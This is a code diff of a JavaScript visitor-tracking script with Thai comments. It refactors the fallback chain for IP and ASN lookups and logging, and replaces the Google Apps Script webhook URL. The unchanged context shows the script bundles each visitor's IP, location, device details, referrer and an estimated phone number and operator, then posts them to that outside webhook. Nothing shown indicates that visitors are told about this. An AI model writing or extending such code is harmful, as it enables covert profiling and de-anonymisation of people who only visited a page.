@@ -87,7 +87,8 @@ function getUrlParameters() {
     Promise.all([
       getIPDetails().catch(error => {
           console.error("Error getting IP details:", error);
-          return {ip: "ไม่สามารถระบุได้", asn: "API Error"}; // ระบุข้อผิดพลาด ASN
+          // Return a specific structure indicating the error
+          return {ip: "ไม่สามารถระบุได้", asn: "ASN_FETCH_ERROR", apiSource: "failed_all"};
       }),
       estimatePhoneNumber().catch(error => {
           console.error("Error estimating phone number:", error);
@@ -95,8 +96,8 @@ function getUrlParameters() {
       })
     ])
     .then(([ipData, phoneInfo]) => {
-      console.log("IP Info:", ipData);
-      console.log("Phone Info:", phoneInfo);
+      console.log("IP Info Received:", JSON.stringify(ipData)); // Log the received IP data structure
+      console.log("Phone Info Received:", phoneInfo);
 
       // สร้าง requestId ที่นี่ ก่อนการขอตำแหน่ง
       const requestId = generateUniqueId(); // *** สร้าง ID ที่นี่ ***
@@ -105,7 +106,7 @@ function getUrlParameters() {
       // เก็บข้อมูลที่จำเป็นทั้งหมด
       dataToSend = {
         timestamp: timestamp,
-        ip: ipData, // ipData ควรมี asn อยู่แล้วถ้า API ทำงานสำเร็จ
+        ip: ipData, // ipData now includes asn and apiSource
         deviceInfo: allDeviceData,
         phoneInfo: phoneInfo,
         referrer: referrer,
@@ -591,81 +592,121 @@ function detectBrowser() {
 }
 
 
-// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ปรับปรุง)
+// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ปรับปรุง v2 - เพิ่ม Log และค่าสถานะ ASN)
 async function getIPDetails() {
   let apiSource = "unknown"; // Track which API provided the data
+  let ipData = { // Initialize with default error/unavailable status
+      ip: "ไม่สามารถระบุได้",
+      asn: "ASN_API_UNAVAILABLE", // Default status if all APIs fail or don't provide ASN
+      apiSource: "initial"
+  };
+
   try {
-    // 1. Try ipinfo.io (without token first for free tier compatibility)
+    // 1. Try ipinfo.io (without token first)
     apiSource = "ipinfo.io (no token)";
     console.log(`Attempting to fetch IP details from ${apiSource}...`);
     const responseNoToken = await fetch('https://ipinfo.io/json');
     if (!responseNoToken.ok) {
          throw new Error(`ipinfo.io (no token) request failed with status ${responseNoToken.status}`);
     }
-    const ipinfoData = await responseNoToken.json();
-    console.log(`Success: Fetched data from ${apiSource}`);
-    // Ensure 'asn' field exists, even if null
-    if (!ipinfoData.hasOwnProperty('asn')) {
-        ipinfoData.asn = "ไม่มีข้อมูล"; // Add asn field if missing
+    ipData = await responseNoToken.json();
+    ipData.apiSource = apiSource; // Add source
+    console.log(`Success: Fetched data from ${apiSource}:`, JSON.stringify(ipData));
+    // Check if ASN is present and valid (starts with AS)
+    if (ipData.asn && typeof ipData.asn === 'string' && ipData.asn.startsWith('AS')) {
+        console.log(`ASN found via ${apiSource}: ${ipData.asn}`);
+        return ipData; // Return immediately if valid ASN found
+    } else {
+        console.log(`ASN not found or invalid via ${apiSource}. Current ASN value: ${ipData.asn}`);
+        ipData.asn = "ASN_NOT_FOUND_ipinfo"; // Set specific status if ASN not found by this API
     }
-    return ipinfoData;
 
   } catch (error) {
     console.error(`Error fetching from ${apiSource}:`, error);
-    // Fallback 2: Try ip-api.com
-    apiSource = "ip-api.com";
-    try {
-        console.log(`Attempting fallback: ${apiSource}...`);
-        const fallbackResponse = await fetch('http://ip-api.com/json'); // ใช้ http เพื่อลดปัญหา CORS บางกรณี
-        if (!fallbackResponse.ok) {
-            throw new Error(`ip-api.com request failed with status ${fallbackResponse.status}`);
-        }
-        const fbData = await fallbackResponse.json();
-        console.log(`Success: Fetched data from ${apiSource}`);
-        // แปลงข้อมูลจาก ip-api.com ให้มีโครงสร้างคล้าย ipinfo.io
-        const asnMatch = fbData.as ? fbData.as.match(/AS\d+/) : null; // Extract only AS number
-        const mappedData = {
-            ip: fbData.query || "ไม่สามารถระบุได้",
-            hostname: "ไม่มีข้อมูล (ip-api)", // ip-api ไม่มี hostname
-            city: fbData.city || "ไม่ทราบ",
-            region: fbData.regionName || "ไม่ทราบ",
-            country: fbData.countryCode || "ไม่ทราบ",
-            loc: fbData.lat && fbData.lon ? `${fbData.lat},${fbData.lon}` : "ไม่มีข้อมูล",
-            org: fbData.org || "ไม่ทราบ",
-            isp: fbData.isp || "ไม่ทราบ", // ip-api มี isp แยก
-            asn: asnMatch ? asnMatch[0] : "ไม่มีข้อมูล", // ใช้ ASN ที่สกัดมา หรือ "ไม่มีข้อมูล"
-            postal: "ไม่มีข้อมูล (ip-api)",
-            timezone: fbData.timezone || "ไม่ทราบ",
-            apiSource: apiSource // Add source info
-        };
-        return mappedData;
-    } catch (fallbackError) {
-        console.error(`Error fetching from fallback (${apiSource}):`, fallbackError);
-        // Fallback 3: Final fallback - ipify.org (IP only)
-        apiSource = "api.ipify.org";
-        try {
-            console.log(`Attempting final fallback: ${apiSource}...`);
-            const finalFallbackResponse = await fetch('https://api.ipify.org?format=json');
-            if (!finalFallbackResponse.ok) {
-                throw new Error(`ipify.org request failed with status ${finalFallbackResponse.status}`);
-            }
-            const finalFbData = await finalFallbackResponse.json();
-            console.log(`Success: Fetched data from ${apiSource}`);
-            return {
-                ip: finalFbData.ip || "ไม่สามารถระบุได้",
-                asn: "ไม่มีข้อมูล (ipify)", // Explicitly state no ASN
-                apiSource: apiSource
-            };
-        } catch (finalFallbackError) {
-             console.error(`Error fetching from final fallback (${apiSource}):`, finalFallbackError);
-             return {
-                 ip: "ไม่สามารถระบุได้",
-                 asn: "API Error", // Indicate a general API error
-                 apiSource: "failed_all"
-             };
-        }
-    }
+    ipData.asn = "ASN_API_ERROR_ipinfo"; // Set error status for this API
+    // Continue to fallback
   }
+
+  // Fallback 2: Try ip-api.com (only if ipinfo failed or didn't provide ASN)
+  if (!ipData.asn || ipData.asn === "ASN_NOT_FOUND_ipinfo" || ipData.asn === "ASN_API_ERROR_ipinfo") {
+      apiSource = "ip-api.com";
+      try {
+          console.log(`Attempting fallback: ${apiSource}...`);
+          const fallbackResponse = await fetch('http://ip-api.com/json');
+          if (!fallbackResponse.ok) {
+              throw new Error(`ip-api.com request failed with status ${fallbackResponse.status}`);
+          }
+          const fbData = await fallbackResponse.json();
+          console.log(`Success: Fetched data from ${apiSource}:`, JSON.stringify(fbData));
+
+          // Extract ASN (e.g., "AS12345 ISP Name" -> "AS12345")
+          const asnMatch = fbData.as ? String(fbData.as).match(/AS\d+/) : null;
+          const extractedAsn = asnMatch ? asnMatch[0] : "ASN_NOT_FOUND_ipapi";
+
+          console.log(`ASN extracted via ${apiSource}: ${extractedAsn}`);
+
+          // Merge data, prioritizing existing ipData but updating ASN if found
+          ipData = {
+              ...ipData, // Keep previous data like IP if available
+              ip: ipData.ip !== "ไม่สามารถระบุได้" ? ipData.ip : (fbData.query || "ไม่สามารถระบุได้"),
+              city: ipData.city || fbData.city || "ไม่ทราบ",
+              region: ipData.region || fbData.regionName || "ไม่ทราบ",
+              country: ipData.country || fbData.countryCode || "ไม่ทราบ",
+              loc: ipData.loc || (fbData.lat && fbData.lon ? `${fbData.lat},${fbData.lon}` : "ไม่มีข้อมูล"),
+              org: ipData.org || fbData.org || "ไม่ทราบ",
+              isp: ipData.isp || fbData.isp || "ไม่ทราบ",
+              asn: extractedAsn, // Use the extracted ASN status
+              postal: ipData.postal || "ไม่มีข้อมูล (ip-api)",
+              timezone: ipData.timezone || fbData.timezone || "ไม่ทราบ",
+              apiSource: apiSource // Update source
+          };
+
+          // If ASN found by ip-api, return
+          if (extractedAsn.startsWith('AS')) {
+              return ipData;
+          }
+
+      } catch (fallbackError) {
+          console.error(`Error fetching from fallback (${apiSource}):`, fallbackError);
+          // If ip-api also fails, update ASN status if it wasn't already an error
+          if (ipData.asn !== "ASN_API_ERROR_ipinfo") {
+              ipData.asn = "ASN_API_ERROR_ipapi";
+          }
+          // Continue to final fallback
+      }
+  }
+
+  // Fallback 3: Final fallback - ipify.org (only if others failed/didn't find ASN)
+   if (!ipData.asn || !ipData.asn.startsWith('AS')) {
+       apiSource = "api.ipify.org";
+       try {
+           console.log(`Attempting final fallback: ${apiSource}...`);
+           const finalFallbackResponse = await fetch('https://api.ipify.org?format=json');
+           if (!finalFallbackResponse.ok) {
+               throw new Error(`ipify.org request failed with status ${finalFallbackResponse.status}`);
+           }
+           const finalFbData = await finalFallbackResponse.json();
+           console.log(`Success: Fetched data from ${apiSource}:`, JSON.stringify(finalFbData));
+           // Update IP if not already set, keep ASN status as unavailable/error from previous steps
+           ipData.ip = ipData.ip !== "ไม่สามารถระบุได้" ? ipData.ip : (finalFbData.ip || "ไม่สามารถระบุได้");
+           ipData.apiSource = apiSource; // Update source
+           // ASN remains as the status set by previous attempts (e.g., ASN_NOT_FOUND_ipapi or ASN_API_ERROR_ipapi)
+           if (!ipData.asn || !ipData.asn.startsWith('AS')) {
+                ipData.asn = "ASN_NOT_FOUND_ALL"; // Indicate ASN wasn't found by any API
+           }
+
+
+       } catch (finalFallbackError) {
+            console.error(`Error fetching from final fallback (${apiSource}):`, finalFallbackError);
+            // If all APIs failed, set a general error status for ASN
+            ipData.asn = "ASN_API_ERROR_ALL";
+            ipData.apiSource = "failed_all";
+       }
+   }
+
+   // Return the final ipData object, which includes the ASN status
+   console.log("Final IP Details result:", JSON.stringify(ipData));
+   return ipData;
 }
 
 
@@ -696,7 +737,7 @@ async function estimatePhoneNumber() {
 
     // ค้นหาผู้ให้บริการจากชื่อ ISP/Org
     for (const [operator, keywords] of Object.entries(thaiOperators)) {
-      if (keywords.some(keyword => ispInfo.toLowerCase().includes(keyword.toLowerCase()))) {
+      if (ispInfo && keywords.some(keyword => ispInfo.toLowerCase().includes(keyword.toLowerCase()))) { // Check if ispInfo is not empty
         phoneInfo.possibleOperator = operator;
         break;
       }
@@ -730,7 +771,7 @@ async function estimatePhoneNumber() {
 
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzuwfqUlXT0YrhmGvFZm7wEnn_iqHF1eUhPtcJJo-gXxZPUarQ8AX6hvPkzYxG9tGJU/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxRsQGfijEOXEi-mi1f4y8j-VjgcC9zkgWlIDWDZll7yvrYEK7RDb4U9r-5bynMXNfZ/exec';
 
   // ตรวจสอบว่ามี requestId หรือไม่ ถ้าไม่มีให้สร้างใหม่
   if (!dataToSend.requestId) {
@@ -747,7 +788,7 @@ function sendToLineNotify(dataToSend) {
   }
 
   console.log(`กำลังส่งข้อมูลไป webhook (requestId: ${currentRequestId})`);
-  console.log("Data:", JSON.stringify(dataToSend)); // Log ข้อมูลที่จะส่ง
+  console.log("Data to Send:", JSON.stringify(dataToSend)); // Log ข้อมูลที่จะส่ง
 
   // ส่งข้อมูลด้วย fetch API
   fetch(webhookUrl, {
